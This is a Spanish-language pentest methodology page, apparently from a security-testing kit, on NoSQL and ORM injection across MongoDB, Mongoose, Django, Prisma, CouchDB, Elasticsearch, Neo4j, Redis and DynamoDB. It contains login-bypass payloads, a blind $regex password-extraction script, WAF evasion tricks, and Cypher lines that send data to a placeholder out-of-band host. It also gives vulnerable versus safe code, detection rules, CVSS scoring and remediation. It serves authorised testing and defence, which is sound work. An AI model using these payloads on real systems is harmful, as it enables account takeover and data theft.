# Inyección NoSQL y de lógica de consulta (NoSQL Injection, NoSQLi)

| Clasificación | |
|---|---|
| CWE | CWE-943 — Improper Neutralization of Special Elements in Data Query Logic (también CWE-89 en motores con sintaxis SQL-like y CWE-1321 si nace de contaminación de prototipos) |
| OWASP Top 10:2025 | A05 — Injection |
| OWASP API Top 10:2023 | Sin categoría propia; frecuente en APIs JSON. Relacionado con API3:2023 Broken Object Property Level Authorization cuando se filtran campos ocultos |
| WSTG | WSTG-INPV-05.6 (Testing for NoSQL Injection); WSTG-INPV-05.7 (ORM Injection) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación por motor · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

Las bases de datos NoSQL (MongoDB, CouchDB, Elasticsearch, Redis, Neo4j, DynamoDB, Cassandra…) no usan SQL clásico, pero sí tienen su propio lenguaje de consulta. Hay dos familias de fallo:

- **Inyección de operadores:** la consulta se construye como un objeto (JSON/BSON) y la aplicación inserta tal cual un valor que el atacante envía como **objeto** en lugar de cadena. Así, `{"password": "x"}` se convierte en `{"password": {"$ne": null}}` (“contraseña distinta de nulo”), que siempre es cierto. Ocurre porque frameworks como Express (`qs`), PHP o Rails convierten `password[$ne]=x` en un objeto anidado y nadie comprueba el tipo.
- **Inyección de sintaxis:** la consulta se construye concatenando una cadena en un lenguaje interpretado: JavaScript en `$where`/`mapReduce` de MongoDB, Cypher en Neo4j, CQL en Cassandra, `query_string` en Elasticsearch, comandos de Redis. Es equivalente a la SQLi clásica.

Una variante moderna es el **ORM Leak** (fuga a través del ORM): ORMs relacionales (Django, Prisma, Sequelize, Beego…) aceptan filtros con operadores en las **claves** o en objetos anidados (`password__startswith`, `{"not": ""}`). Si el usuario controla esas claves u objetos, puede filtrar por campos que no debería ver y extraerlos carácter a carácter. Aunque el SGBD sea SQL, la clase de fallo es CWE-943 y se trata aquí.

## 2. Dónde buscar (señales del reconocimiento)

- Pila Node.js + Express + MongoDB/Mongoose (la más frecuente), APIs JSON, MEAN/MERN, Meteor, Parse Server, Strapi, Payload CMS.
- Login, recuperación de contraseña (comprobación de token), búsqueda con filtros, endpoints `/api/*/search`, `filter=`, `where=`, `query=` que aceptan JSON.
- Parámetros que el frontend envía como objeto (`sort`, `filter`, `projection`) o APIs que reenvían el cuerpo a `find()`.
- Errores reveladores: `MongoError`, `CastError`, `BSONTypeError`, `unknown operator: $foo`, `SyntaxError: unterminated string` (en `$where`), `Neo.ClientError.Statement.SyntaxError`, `search_phase_execution_exception` (Elasticsearch).
- Cabeceras `X-Powered-By: Express`, cookies `connect.sid`, puertos 27017/5984/9200/6379/7474 en recon de infraestructura.
- ORM Leak: APIs que aceptan filtros genéricos tipo `?filter[campo][operador]=`, `?where={...}`, GraphQL con `where` libre, Django REST con `filterset_fields='__all__'` o `filter(**request.GET)`.

## 3. Detección segura (primeras sondas, no destructivas)

Prueba **ambos** formatos: JSON y `application/x-www-form-urlencoded` con corchetes. Cambiar el `Content-Type` a menudo activa un parser distinto.

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":"corvus_test","password":{"$ne":"x"}}
```

```text
username=corvus_test&password[$ne]=x
username[$eq]=corvus_test&password[$exists]=true
```

Sondas de tipo y operador (comparar con la respuesta base):

```json
{"q": {"$gt": ""}}             ← devuelve “todo” si se inyecta
{"q": {"$regex": "^"}}          ← equivalente a “cualquier cadena”
{"q": {"$in": ["a","b"]}}
{"q": {"$foo": 1}}              ← error "unknown operator" confirma que llega a Mongo
{"q": true} {"q": 1} {"q": null} {"q": []}   ← confusión de tipos
```

Inyección de sintaxis JavaScript (`$where` o consulta construida como cadena):

```text
'                                 → error de sintaxis JS
corvus' && 'a'=='a                → verdadero
corvus' && 'a'=='b                → falso
corvus'||'1'=='1
'; return true; var x='
```

Retardo (solo si `$where`/JS de servidor está activo; usa 2–3 s):

```json
{"$where": "sleep(2000) || true"}
{"username": "corvus_test", "$where": "sleep(2000)"}
```

En formulario: `username=corvus_test'+%26%26+sleep(2000)+%26%26+'1`.

## 4. Explotación por contexto o tecnología

### 4.1 MongoDB — bypass de autenticación

```json
{"username":"admin","password":{"$ne":null}}
{"username":{"$regex":"^adm"},"password":{"$ne":""}}
{"username":{"$in":["admin","administrator","root"]},"password":{"$gt":""}}
{"username":{"$nin":["corvus_test"]},"password":{"$exists":true}}
```

Usa preferentemente la cuenta de prueba del cliente para demostrar el bypass; el login como `admin` real solo si está autorizado.

### 4.2 MongoDB — extracción ciega con `$regex`

```json
{"username":"corvus_test","password":{"$regex":"^.{8}$"}}        ← longitud exacta
{"username":"corvus_test","password":{"$regex":"^a"}}            ← primer carácter
{"username":"corvus_test","password":{"$regex":"^ab"}}           ← siguiente…
{"token":{"$regex":"^[0-9a-f]{32}$"}}                             ← formato
```

Escapa metacaracteres de regex (`.`, `*`, `+`, `?`, `$`, `^`, `|`, `(`) al probar cada carácter. En urlencoded: `password[$regex]=^a`.

Script de extracción (contra la cuenta propia o un token de recuperación de una cuenta de prueba):

```python
import requests, string, re
URL = "https://objetivo/api/login"
charset = string.ascii_letters + string.digits + "_-@!"
found = ""
while True:
    for c in charset:
        r = requests.post(URL, json={"username": "corvus_test",
                                     "password": {"$regex": "^" + re.escape(found + c)}},
                          allow_redirects=False, timeout=10)
        if r.status_code == 302 or "dashboard" in r.text:
            found += c; print(found); break
    else:
        break
```

### 4.3 MongoDB — JavaScript de servidor

```json
{"$where":"this.username=='corvus_test' && this.password.length==8"}
{"$where":"this.username=='corvus_test' && this.password[0]=='a'"}
{"$where":"function(){ return this.role=='admin' }"}
```

Operadores de agregación con JS (`$function`, `$accumulator`, MongoDB ≥ 4.4) si la aplicación pasa un *pipeline* controlado por el usuario a `aggregate()`:

```json
[{"$match":{"$expr":{"$function":{"body":"function(){return true}","args":[],"lang":"js"}}}}]
```

En agregaciones también son útiles `$lookup` (leer otra colección) y `$unionWith`:

```json
[{"$lookup":{"from":"users","localField":"x","foreignField":"x","as":"leak"}}]
```

⚠️ `sleep()` largos o bucles en `$where` bloquean hilos del servidor de BD: mantener por debajo de 3 s y pocas repeticiones.

### 4.4 Mongoose / ODM

- `Model.find(req.body)` o `Model.find({ email: req.query.email })` sin `sanitizeFilter` aceptan operadores.
- `populate({ match: … })` con datos de usuario permitía `$where` en versiones vulnerables (CVE-2024-53900 y CVE-2025-23061): ejecución de JS en el proceso Node.
- `strictQuery: false` deja pasar campos inexistentes en el esquema.

### 4.5 ORM Leak (filtros relacionales controlados por el usuario)

```text
# Django con filter(**request.GET.dict()) o filterset con __all__
GET /api/users?username=admin&password__startswith=pbkdf2_sha256$600000$a
GET /api/articles?created_by__password__regex=^pbkdf2
GET /api/articles?created_by__user_permissions__codename=delete_user
```

```json
// Prisma: objeto en lugar de cadena en un filtro de igualdad
{"resetToken": {"not": ""}}                      ← cualquier token no vacío
{"resetToken": {"startsWith": "a"}}              ← extracción carácter a carácter
// Filtros relacionales
{"where": {"createdBy": {"password": {"startsWith": "$2b$"}}}}
```

```text
# Sequelize / APIs con where libre
?where[password][$like]=a%       (Sequelize v4 con operatorsAliases)
?where[password][startsWith]=a
```

El patrón es siempre el mismo: un **oráculo booleano** (aparece o no el resultado) más un operador de prefijo o regex sobre un campo oculto.

### 4.6 Otros motores

**CouchDB (Mango / HTTP API)**
```json
{"selector":{"password":{"$gt":null}}}
{"selector":{"_id":{"$regex":"^admin"}}}
```
Si se expone la API: `GET /_all_dbs`, `GET /db/_all_docs?include_docs=true`. Históricamente, el doble manejo de claves JSON duplicadas permitió escalar a admin (CVE-2017-12635, `"roles": ["_admin"], "roles": []`).

**Elasticsearch / OpenSearch**
```json
{"query":{"query_string":{"query":"status:public OR status:private"}}}
```
Entrada concatenada en `query_string`: `*`, `_exists_:password`, `OR`, `field:*` amplían el alcance; `"script"` con Painless en búsquedas permite lógica de servidor (requiere scripts habilitados). Busca también endpoints proxy que reenvían `_search` sin restricción de índice (`/_cat/indices`).

**Neo4j (Cypher)**
```cypher
' OR 1=1 RETURN n//
' OR 1=1 WITH 1 AS x CALL dbms.components() YIELD name, versions RETURN name, versions//
' OR 1=1 WITH 1 AS x LOAD CSV FROM 'http://OAST/'+toString(1337*7) AS y RETURN y//
' OR 1=1 WITH 1 AS x CALL db.labels() YIELD label LOAD CSV FROM 'http://OAST/?l='+label AS y RETURN y//
```
`LOAD CSV FROM` y `apoc.load.*` hacen peticiones salientes (OOB y SSRF). Usa parámetros `$name` como remedio.

**Redis**
Concatenación en comandos (`"GET user:" + id`) o en protocolo RESP: con CRLF (`%0d%0a`) se inyectan comandos adicionales. `EVAL` con script construido a mano es inyección Lua.
```text
id=1%0d%0aINFO%0d%0a
```
⚠️ `CONFIG SET`, `FLUSHALL`, `SAVE` modifican el servidor: **requiere confirmación explícita del cliente**. Demuestra con `INFO` o `PING`.

**Cassandra (CQL):** sintaxis tipo SQL sin subconsultas ni UNION; sirven `' AND token(id)>0 ALLOW FILTERING--` y booleanas simples. Tratar como SQLi limitada (`vulns/sqli.md`).

**DynamoDB (API heredada `ScanFilter`/`QueryFilter`):** si el cliente controla el `ComparisonOperator`:
```json
{"username":{"ComparisonOperator":"GT","AttributeValueList":[{"S":"*"}]}}
```
Con `FilterExpression` concatenada: `#u = :u OR attribute_exists(password)`.

**GraphQL sobre Mongo/Prisma/Hasura:** argumentos `where`/`filter` de tipo JSON (`JSON` scalar) son la puerta de entrada; ver `vulns/graphql.md`.

## 5. Evasión de filtros y WAF

- Alternar `Content-Type`: JSON, urlencoded con corchetes (`a[$ne]=`), multipart, `text/plain` con cuerpo JSON (Express con `bodyParser.json({type:'*/*'})`).
- Operadores equivalentes: `$ne`↔`$nin`↔`$not`, `$gt`↔`$gte`↔`$regex:"^"`, `$in` con una lista, `$exists`, `$expr`/`$eq` combinados.
- Escapes JSON: `{"password":{"$ne":null}}` (el `$` escapado como `$`) evade filtros que buscan `$ne` en el texto crudo.
- Profundidad: si el sanitizador solo limpia el primer nivel, anida: `{"filter":{"$or":[{"password":{"$ne":null}}]}}`.
- `qs` de Express: `a[0]=x&a[1]=y` crea arrays; `a[__proto__][x]=1` puede llevar a contaminación de prototipos (ver `vulns/prototype-pollution.md`).
- Regex: `(?i)` para insensibilidad a mayúsculas, clases `[\s\S]` en lugar de `.`.
- PHP: `password[$ne]=x` crea un array; muchas aplicaciones PHP+Mongo comprueban `is_string` solo en algunos campos.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

1. **Bypass de autenticación** sobre la cuenta de prueba → luego sobre cuentas privilegiadas si está autorizado.
2. **Extracción de secretos** de una cuenta de prueba: hash de contraseña, token de recuperación, API key, segundo factor; demuestra que el mismo método funcionaría con cualquier usuario sin hacerlo.
3. **Toma de cuenta**: extraer el token de restablecimiento de contraseña de la cuenta de prueba con `$regex` → restablecer → acceso.
4. **Enumeración**: `$regex` sobre `username`/`email` para listar existencia de cuentas (indica el número, no copies los correos).
5. **JS de servidor** (`$where`, `$function`) → lectura de otros documentos y DoS; en motores mal configurados, SSRF/OOB (Neo4j `LOAD CSV`, Elasticsearch con scripts).
6. **Encadenar** con IDOR (`vulns/access-control-idor.md`): filtros que permiten consultar documentos de otros tenants.

## 7. Caja blanca: fuentes, sumideros y patrones de código

**Node / Express / Mongoose**
```js
// Vulnerable
User.findOne({ username: req.body.username, password: req.body.password });
db.collection('users').find({ $where: `this.name == '${req.query.name}'` });
Article.find(req.query);          // filtro entero controlado
prisma.user.findFirst({ where: { resetToken: req.body.token } });   // token puede ser objeto
// Seguro
const username = String(req.body.username);   // o validación con zod/joi: z.string()
mongoose.set('sanitizeFilter', true);          // convierte objetos con $ en $eq
User.findOne({ username: { $eq: username } });
if (typeof req.body.token !== 'string') return res.sendStatus(400);
```

**PHP (driver mongodb)**
```php
// Vulnerable
$users->findOne(['user' => $_POST['user'], 'pass' => $_POST['pass']]);
// Seguro
$users->findOne(['user' => (string)$_POST['user'], 'pass' => (string)$_POST['pass']]);
```

**Python (PyMongo / Django)**
```python
# Vulnerable
db.users.find_one({"user": request.json["user"], "pass": request.json["pass"]})
db.users.find({"$where": f"this.name == '{name}'"})
User.objects.filter(**request.GET.dict())
# Seguro
if not isinstance(data["user"], str): abort(400)
ALLOWED = {"category", "status"}
User.objects.filter(**{k: v for k, v in request.GET.items() if k in ALLOWED})
```

**Java (Spring Data MongoDB)**
```java
// Vulnerable
BasicQuery q = new BasicQuery("{ username: '" + user + "' }");
mongoTemplate.find(new BasicQuery("{ $where: \"this.a == '" + a + "'\" }"), User.class);
// Seguro
Query q = new Query(Criteria.where("username").is(user));
```

**.NET (MongoDB.Driver)**
```csharp
// Vulnerable
var filter = BsonDocument.Parse("{ username: '" + user + "' }");
// Seguro
var filter = Builders<User>.Filter.Eq(u => u.Username, user);
```

**Go (mongo-go-driver)**
```go
// Vulnerable: decodificar el cuerpo directamente en bson.M y pasarlo a Find
var f bson.M; json.NewDecoder(r.Body).Decode(&f); coll.Find(ctx, f)
// Seguro: struct tipado
var in struct{ User string `json:"user"` }; coll.FindOne(ctx, bson.D{{"user", in.User}})
```

**Ruby (Mongoid)**
```ruby
# Vulnerable
User.where(username: params[:username], password: params[:password])   # params puede ser Hash
# Seguro
User.where(username: params[:username].to_s, password: params[:password].to_s)
```

**Neo4j**
```js
// Vulnerable
session.run(`MATCH (u:User) WHERE u.name = '${name}' RETURN u`);
// Seguro
session.run('MATCH (u:User) WHERE u.name = $name RETURN u', { name });
```

**Búsqueda (ripgrep / semgrep)**

```bash
rg -n '\$where|mapReduce|\$function|\$accumulator' --type js --type py --type php --type java
rg -n --pcre2 '\.(find|findOne|findOneAndUpdate|updateOne|deleteMany|aggregate|count(Documents)?)\(\s*req\.(body|query|params)' --type js
rg -n --pcre2 '\.(find|findOne)\(\s*\{[^}]*:\s*req\.(body|query)\.\w+' --type js
rg -n 'sanitizeFilter|express-mongo-sanitize|mongo-sanitize' --type js       # ausencia = señal
rg -n --pcre2 'filter\(\*\*(request|self\.request)\.' --type py               # ORM Leak Django
rg -n 'BasicQuery\(|BsonDocument\.Parse\(' 
rg -n --pcre2 'session\.run\(\s*`[^`]*\$\{' --type js                          # Cypher
semgrep --config p/nodejsscan --config p/owasp-top-ten .
```

```yaml
rules:
- id: corvus-mongo-req-into-query
  languages: [javascript, typescript]
  severity: WARNING
  message: Objeto de petición usado como filtro de MongoDB sin forzar tipo
  pattern-either:
    - pattern: $M.$F({..., $K: req.body.$X, ...})
    - pattern: $M.$F(req.body)
    - pattern: $M.$F(req.query)
  metavariable-regex: { metavariable: $F, regex: ^(find|findOne|findOneAndUpdate|updateOne|updateMany|deleteOne|deleteMany|countDocuments)$ }
```

## 8. Falsos positivos frecuentes

- La aplicación rechaza el objeto con 400 o lo convierte a la cadena `"[object Object]"`: no hay inyección (verifica que el login con `$ne` **no** funciona con una contraseña errónea sin operador).
- `$regex` que “funciona” porque el campo es público y la búsqueda ya era por prefijo legítimo.
- Diferencias de tiempo atribuibles a carga o a índices, no a `sleep()`.
- Errores `CastError` de Mongoose: indican que el valor llega al ODM pero que el esquema lo bloquea; no es explotable si siempre se castea a String.
- `express-mongo-sanitize` activo pero solo en `body`: prueba `query` y `params` antes de descartar.

## 9. Evidencia mínima para validarlo

- Petición base (falla con credenciales erróneas) y petición con operador (éxito) sobre la cuenta de prueba.
- Para extracción: secuencia de 3–4 peticiones `$regex` mostrando el oráculo y el valor parcial obtenido de **la cuenta propia**.
- Motor, versión si se obtiene, `Content-Type` y formato que funcionó.
- Si hay JS de servidor: prueba de tiempo con 0 s / 2 s repetida.

## 10. Severidad orientativa

| Impacto | CVSS 3.1 | CVSS 4.0 (calcular con FIRST) |
|---|---|---|
| Bypass de login sin autenticación a cualquier cuenta | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (9.1) | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Extracción de hashes/tokens sin autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` (≈8.7) |
| ORM Leak autenticado de campos de otros usuarios | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (6.5) | `…/PR:L/…/VC:H/VI:N/VA:N/…` |
| Solo enumeración de usuarios | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (5.3) | `…/VC:L/VI:N/VA:N/…` |
| JS de servidor con DoS demostrable (sin ejecutarlo a fondo) | añadir `A:H` según evidencia | añadir `VA:H` |

## 11. Remediación

1. **Forzar tipos** en la frontera: validar esquemas (zod, joi, Pydantic, Bean Validation) y rechazar objetos donde se espera una cadena.
2. Construir filtros con builders tipados (`$eq` explícito, `Criteria`, `Builders<T>.Filter`), nunca pasar `req.body`/`req.query` directamente.
3. Mongoose: `mongoose.set('sanitizeFilter', true)` y `strictQuery: true`; complementar con `express-mongo-sanitize` en body, query y params.
4. Desactivar JavaScript de servidor (`security.javascriptEnabled: false` en `mongod.conf`) si no se usa.
5. Filtros genéricos de API: lista blanca de campos **y** de operadores; nunca permitir relaciones hacia campos sensibles (contraseñas, tokens).
6. Cypher/CQL/Redis: parámetros del driver, nunca concatenación.

```js
import { z } from "zod";
const Login = z.object({ username: z.string().max(64), password: z.string().max(256) });
app.post("/login", async (req, res) => {
  const { username, password } = Login.parse(req.body);   // objeto ⇒ 400
  const user = await User.findOne({ username: { $eq: username } });
  if (!user || !(await bcrypt.compare(password, user.hash))) return res.sendStatus(401);
  /* … */
});
```

## 12. Herramientas

- **Burp Suite** Repeater/Intruder; extensión *NoSQLi Scanner* como apoyo.
- **nosqli** (Go): `nosqli scan -t "https://objetivo/api/search?q=x"` — detección tras confirmar manualmente.
- **NoSQLMap**: automatización de MongoDB/CouchDB; usar en modo no destructivo.
- Script propio de `$regex` (§4.2) con limitación de velocidad.
- **semgrep** (`p/nodejsscan`), **CodeQL** (`js/sql-injection` cubre también NoSQL en JS).

## 13. Referencias

- OWASP WSTG — Testing for NoSQL Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Tests/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
- PortSwigger Web Security Academy — NoSQL injection: https://portswigger.net/web-security/nosql-injection
- PayloadsAllTheThings — NoSQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- HackTricks — NoSQL injection: https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html
- elttam — “plORMbing your Django ORM” y “plORMbing your Prisma ORM” (ORM Leak, 2024).
- MongoDB Security Checklist: https://www.mongodb.com/docs/manual/administration/security-checklist/
- CWE-943: https://cwe.mitre.org/data/definitions/943.html
- Relacionados: `vulns/sqli.md`, `vulns/prototype-pollution.md`, `vulns/graphql.md`, `vulns/authentication.md`.
